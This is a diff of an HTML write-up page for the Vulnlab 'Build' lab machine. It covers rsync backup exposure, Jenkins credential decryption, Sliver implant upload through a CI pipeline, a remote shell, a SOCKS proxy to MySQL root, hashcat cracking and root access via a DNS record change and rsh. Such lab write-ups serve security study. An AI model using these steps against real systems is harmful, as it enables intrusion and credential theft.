@@ -264,10 +264,10 @@
   <ol>
     <li><a href="#enumeration">Enumeration</a>
       <ol>
-        <li><a href="#nmap-scan">Nmap scan</a></li>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
       </ol>
     </li>
-    <li><a href="#http---3000">HTTP - 3000</a>
+    <li><a href="#http---port-3000">HTTP - Port 3000</a>
       <ol>
         <li><a href="#gitea">Gitea</a></li>
       </ol>
@@ -275,26 +275,26 @@
     <li><a href="#rsync">Rsync</a></li>
     <li><a href="#backup">Backup</a>
       <ol>
-        <li><a href="#jenkins-credentials-decryptor">jenkins-credentials-decryptor</a></li>
+        <li><a href="#jenkins-credentials-decryptor">Jenkins Credentials Decryptor</a></li>
       </ol>
     </li>
-    <li><a href="#shell-access">Shell access</a>
+    <li><a href="#shell-access">Shell Access</a>
       <ol>
         <li><a href="#sliver">Sliver</a></li>
         <li><a href="#implant-upload">Implant Upload</a></li>
       </ol>
     </li>
-    <li><a href="#mysql-server">MySQL server</a>
+    <li><a href="#mysql-server">MySQL Server</a>
       <ol>
         <li><a href="#sliver-socks5">Sliver socks5</a></li>
         <li><a href="#powerdns">PowerDNS</a></li>
         <li><a href="#hashcat">hashcat</a></li>
       </ol>
     </li>
-    <li><a href="#privilege-escalation">Privilege escalation</a>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
       <ol>
         <li><a href="#powerdns-1">PowerDNS</a></li>
-        <li><a href="#rsh">rsh</a></li>
+        <li><a href="#rsh">RSH</a></li>
       </ol>
     </li>
   </ol>
@@ -370,23 +370,9 @@
     <section class="article-content">
     
     
-    <p><img src="/p/vulnlab-build-writeup/build.png"
-	width="534"
-	height="616"
-	srcset="/p/vulnlab-build-writeup/build_hu_5393cb697efdaca7.png 480w, /p/vulnlab-build-writeup/build_hu_edf9de9ae443cf49.png 1024w"
-	loading="lazy"
-	
-		alt="pwned"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="86"
-		data-flex-basis="208px"
-	
-></p>
-<h2 id="enumeration">Enumeration
-</h2><h3 id="nmap-scan">Nmap scan
-</h3><p>I start with a standard scan using nmap</p>
+    <h2 id="enumeration">Enumeration
+</h2><h3 id="nmap-scan">Nmap Scan
+</h3><p>I started by performing a standard nmap scan:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -557,38 +543,10 @@
 </span></span><span class="line"><span class="cl">SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="http---3000">HTTP - 3000
-</h2><p>On port 3000, there is Gitea, which contains 1 public repository</p>
+</div><h2 id="http---port-3000">HTTP - Port 3000
+</h2><p>Port 3000 is running Gitea, which hosts a single public repository.</p>
 <h3 id="gitea">Gitea
-</h3><p><img src="/p/vulnlab-build-writeup/gitea1.png"
-	width="928"
-	height="489"
-	srcset="/p/vulnlab-build-writeup/gitea1_hu_88869dc9b338fc25.png 480w, /p/vulnlab-build-writeup/gitea1_hu_9c1a2686903f6aae.png 1024w"
-	loading="lazy"
-	
-		alt="gitea1"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="189"
-		data-flex-basis="455px"
-	
-></p>
-<p><img src="/p/vulnlab-build-writeup/gitea2.png"
-	width="927"
-	height="908"
-	srcset="/p/vulnlab-build-writeup/gitea2_hu_cf0099f790aad332.png 480w, /p/vulnlab-build-writeup/gitea2_hu_cc8303b2edbd2e3a.png 1024w"
-	loading="lazy"
-	
-		alt="gitea2"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="102"
-		data-flex-basis="245px"
-	
-></p>
-<p>In the public repository, there is a jenkins pipeline</p>
+</h3><p>The public repository contains a Jenkins pipeline configuration.</p>
 <h2 id="rsync">Rsync
 </h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -606,21 +564,7 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av --list-only rsync://10.10.104.46/backups/
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/vulnlab-build-writeup/rsync-jenkins.png"
-	width="1379"
-	height="172"
-	srcset="/p/vulnlab-build-writeup/rsync-jenkins_hu_d688be9be42cbcbc.png 480w, /p/vulnlab-build-writeup/rsync-jenkins_hu_e913e1a4d30d59a5.png 1024w"
-	loading="lazy"
-	
-		alt="rsync"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="801"
-		data-flex-basis="1924px"
-	
-></p>
-<p>The machine also has an exposed rsync, which contains a jenkins backup</p>
+</div><p>The machine also exposes an rsync service, which contains a Jenkins backup.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -630,25 +574,11 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="backup">Backup
-</h2><h3 id="jenkins-credentials-decryptor">jenkins-credentials-decryptor
-</h3><p><a class="link" href="https://github.com/hoto/jenkins-credentials-decryptor"  target="_blank" rel="noopener"
-    ><img src="/p/vulnlab-build-writeup/jcd.png"
-	width="399"
-	height="199"
-	srcset="/p/vulnlab-build-writeup/jcd_hu_9414564b2a5cc4e5.png 480w, /p/vulnlab-build-writeup/jcd_hu_f6f8249fd17eca77.png 1024w"
-	loading="lazy"
-	
-		alt="jenkins-creds-decryptor"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="200"
-		data-flex-basis="481px"
-	
-></a></p>
+</h2><h3 id="jenkins-credentials-decryptor">Jenkins Credentials Decryptor
+</h3><p>[</p>
 <p><a class="link" href="https://github.com/hoto/jenkins-credentials-decryptor"  target="_blank" rel="noopener"
     >https://github.com/hoto/jenkins-credentials-decryptor</a></p>
-<p>Having access to the Jenkins backup using the <code>jenkins-credentials-decryptor tool</code>, I was able to decrypt the password for the user <code>buildadm</code></p>
+<p>With access to the Jenkins backup, I used the <code>jenkins-credentials-decryptor</code> tool to decrypt the password for the <code>buildadm</code> user.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -673,23 +603,9 @@
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>       -o json
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/vulnlab-build-writeup/jdecrypt.png"
-	width="809"
-	height="356"
-	srcset="/p/vulnlab-build-writeup/jdecrypt_hu_ef8a268dd65bcd5.png 480w, /p/vulnlab-build-writeup/jdecrypt_hu_60931968526f1333.png 1024w"
-	loading="lazy"
-	
-		alt="backup-dcrypt"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="227"
-		data-flex-basis="545px"
-	
-></p>
-<p>I can currently log in to Gitea</p>
-<h2 id="shell-access">Shell access
-</h2><p>Next, I decided to upload the sliver implant to the machine through the pipeline</p>
+</div><p>I can now log into Gitea using these credentials.</p>
+<h2 id="shell-access">Shell Access
+</h2><p>Next, I uploaded the Sliver implant to the target machine via the pipeline.</p>
 <h3 id="sliver">Sliver
 </h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -725,7 +641,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>    /tmp/LAZY_POLO
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>http server</code></p>
+</div><p><code>HTTP Server</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -734,21 +650,7 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 -m http.server
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/vulnlab-build-writeup/gitea-curl.png"
-	width="1317"
-	height="473"
-	srcset="/p/vulnlab-build-writeup/gitea-curl_hu_14063f64a2706df9.png 480w, /p/vulnlab-build-writeup/gitea-curl_hu_89f79dc78310dd83.png 1024w"
-	loading="lazy"
-	
-		alt="bulidadm/dev"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="278"
-		data-flex-basis="668px"
-	
-></p>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -764,37 +666,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sliver (LAZY_POLO) &gt; shell
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>I managed to gain access to the shell and get the contents of the first flag</p>
-<p><img src="/p/vulnlab-build-writeup/shell1.png"
-	width="658"
-	height="38"
-	srcset="/p/vulnlab-build-writeup/shell1_hu_45cb67891adbbaca.png 480w, /p/vulnlab-build-writeup/shell1_hu_b99dac5f990b7939.png 1024w"
-	loading="lazy"
-	
-		alt="shell"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="1731"
-		data-flex-basis="4155px"
-	
-></p>
-<p><img src="/p/vulnlab-build-writeup/shell2.png"
-	width="276"
-	height="49"
-	srcset="/p/vulnlab-build-writeup/shell2_hu_1ae9a1d784b101f.png 480w, /p/vulnlab-build-writeup/shell2_hu_4ec2ff6bd6a1015e.png 1024w"
-	loading="lazy"
-	
-		alt="shell"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="563"
-		data-flex-basis="1351px"
-	
-></p>
-<p>Everything indicates that we are inside the container :/</p>
-<h2 id="mysql-server">MySQL server
+</div><p>I successfully gained shell access and retrieved the first flag.</p>
+<p>It appears that I am inside a container.</p>
+<h2 id="mysql-server">MySQL Server
 </h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -803,7 +677,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3306/tcp filtered mysql
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Using a proxy, we are able to log in to the MySQL server as root</p>
+</div><p>Using a proxy, I was able to log into the MySQL server as root.</p>
 <h3 id="sliver-socks5">Sliver socks5
 </h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -814,7 +688,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
-<p>remember to properly configure proxychains!</p></blockquote>
+<p>Remember to properly configure proxychains!</p></blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -823,36 +697,8 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains4 mysql -u root -h 172.18.0.1 --skip-ssl
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/vulnlab-build-writeup/mariadb1.png"
-	width="397"
-	height="286"
-	srcset="/p/vulnlab-build-writeup/mariadb1_hu_adbe81b205fbb61d.png 480w, /p/vulnlab-build-writeup/mariadb1_hu_a4651f95dab353c5.png 1024w"
-	loading="lazy"
-	
-		alt="mariadb"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="138"
-		data-flex-basis="333px"
-	
-></p>
-<h3 id="powerdns">PowerDNS
-</h3><p>From the PowerDNS database, we can obtain the administrator password using hashcat</p>
-<p><img src="/p/vulnlab-build-writeup/mariadb2.png"
-	width="1417"
-	height="144"
-	srcset="/p/vulnlab-build-writeup/mariadb2_hu_f2867a6d01ca1770.png 480w, /p/vulnlab-build-writeup/mariadb2_hu_f93dbb5738942cd3.png 1024w"
-	loading="lazy"
-	
-		alt="mariadb"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="984"
-		data-flex-basis="2361px"
-	
-></p>
+</div><h3 id="powerdns">PowerDNS
+</h3><p>From the PowerDNS database, I obtained the administrator password using hashcat.</p>
 <h3 id="hashcat">hashcat
 </h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -862,7 +708,7 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">hashcat -a <span class="m">0</span> -m <span class="m">3200</span> hash.txt /usr/share/wordlists/rockyou.txt
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="privilege-escalation">Privilege escalation
+</div><h2 id="privilege-escalation">Privilege Escalation
 </h2><h3 id="powerdns-1">PowerDNS
 </h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -872,65 +718,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from history;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/vulnlab-build-writeup/mariadb3.png"
-	width="1854"
-	height="233"
-	srcset="/p/vulnlab-build-writeup/mariadb3_hu_f60c342134fcc51c.png 480w, /p/vulnlab-build-writeup/mariadb3_hu_e64508a3f984f002.png 1024w"
-	loading="lazy"
-	
-		alt="mariadb"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="795"
-		data-flex-basis="1909px"
-	
-></p>
-<p>In the database, in the <code>history</code> table, I found several IP addresses, and under one of them is the PowerDNS admin panel</p>
+</div><p>In the database&rsquo;s <code>history</code> table, I found several IP addresses, and one of them led to the PowerDNS admin panel.</p>
 <p><code>172.18.0.6</code></p>
-<p><img src="/p/vulnlab-build-writeup/powerdns1.png"
-	width="1176"
-	height="680"
-	srcset="/p/vulnlab-build-writeup/powerdns1_hu_866c2421d6eebdf2.png 480w, /p/vulnlab-build-writeup/powerdns1_hu_9c402d803f6d499b.png 1024w"
-	loading="lazy"
-	
-		alt="powerdns"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="172"
-		data-flex-basis="415px"
-	
-></p>
-<p><img src="/p/vulnlab-build-writeup/powerdns2.png"
-	width="1837"
-	height="988"
-	srcset="/p/vulnlab-build-writeup/powerdns2_hu_d9ba47c02f7dc50e.png 480w, /p/vulnlab-build-writeup/powerdns2_hu_37552d6ed1aa8cd8.png 1024w"
-	loading="lazy"
-	
-		alt="powerdns"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="185"
-		data-flex-basis="446px"
-	
-></p>
-<p><img src="/p/vulnlab-build-writeup/powerdns3.png"
-	width="1610"
-	height="609"
-	srcset="/p/vulnlab-build-writeup/powerdns3_hu_a95bdde5cc12cca.png 480w, /p/vulnlab-build-writeup/powerdns3_hu_5911ed712664788f.png 1024w"
-	loading="lazy"
-	
-		alt="powerdns"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="264"
-		data-flex-basis="634px"
-	
-></p>
-<h3 id="rsh">rsh
+<h3 id="rsh">RSH
 </h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -939,7 +729,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rsh 10.10.104.46
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>After setting my own IP address for the <code>intern</code> record in the DNS zone and using the <code>rsh</code> client, I gain access as <code>root</code></p>
+</div><p>After setting my own IP address as the <code>intern</code> DNS record and using the <code>rsh</code> client, I gained root access.</p>
 
 </section>
 
